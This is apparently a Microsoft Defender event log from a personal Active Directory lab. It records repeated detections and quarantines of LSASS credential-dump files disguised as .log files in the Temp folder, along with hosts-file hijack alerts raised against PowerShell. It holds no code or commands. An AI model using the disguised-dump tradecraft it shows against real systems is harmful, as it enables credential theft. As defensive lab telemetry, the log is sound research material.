               	Path: file:_C:\Windows\Temp\yabadabadoo1.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: System
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 1:56:28 PM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.B&threatid=2147893513&enterprise=0
               	Name: Trojan:Win32/LsassDump.B
               	ID: 2147893513
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\yabadabadoo1.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT Authority\System
               	Process Name: System
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 1:33:01 PM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\yabadabadoo1.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 1:32:51 PM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\yabadabadoo1.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 12:26:37 PM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 12:26:27 PM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:51:35 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:49:03 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:46:19 AM
Id          : 1117
Message     : Microsoft Defender Antivirus has taken action to protect this machine from malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Action: Quarantine
               	Action Status:  No additional actions required
               	Error Code: 0x00000000
               	Error description: The operation completed successfully. 
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:45:55 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=Trojan:Win32/LsassDump.A&threatid=2147816345&enterprise=0
               	Name: Trojan:Win32/LsassDump.A
               	ID: 2147816345
               	Severity: Severe
               	Category: Trojan
               	Path: file:_C:\Windows\Temp\update.log
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: 
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:34:12 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.449.230.0, AS: 1.449.230.0, NIS: 1.449.230.0
               	Engine Version: AM: 1.1.26030.3008, NIS: 1.1.26030.3008

TimeCreated : 4/21/2026 11:30:35 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: System
               	User: NT AUTHORITY\SYSTEM
               	Process Name: Unknown
               	Security intelligence Version: AV: 1.443.1118.0, AS: 1.443.1118.0, NIS: 1.443.1118.0
               	Engine Version: AM: 1.1.25110.1, NIS: 1.1.25110.1

TimeCreated : 4/21/2026 11:26:01 AM
Id          : 1116
Message     : Microsoft Defender Antivirus has detected malware or other potentially unwanted software.
               For more information please see the following:
              https://go.microsoft.com/fwlink/?linkid=37020&name=SettingsModifier:Win32/PossibleHostsFileHijack&threatid=14994&enterprise=0
               	Name: SettingsModifier:Win32/PossibleHostsFileHijack
               	ID: 14994
               	Severity: Medium
               	Category: Settings Modifier
               	Path: file:_C:\Windows\System32\drivers\etc\hosts
               	Detection Origin: Local machine
               	Detection Type: Concrete
               	Detection Source: Real-Time Protection
               	User: LAB\Administrator
               	Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
               	Security intelligence Version: AV: 1.443.1118.0, AS: 1.443.1118.0, NIS: 1.443.1118.0
               	Engine Version: AM: 1.1.25110.1, NIS: 1.1.25110.1

<img width="577" height="433" alt="3scq31" src="https://github.com/user-attachments/assets/42bc92c6-6032-4d66-a492-a2c3a24bbf51" />



*Lab: lab2019.local | Author: Osher Jacobs | GitHub: osherjacobs/AD-Lab-Research*
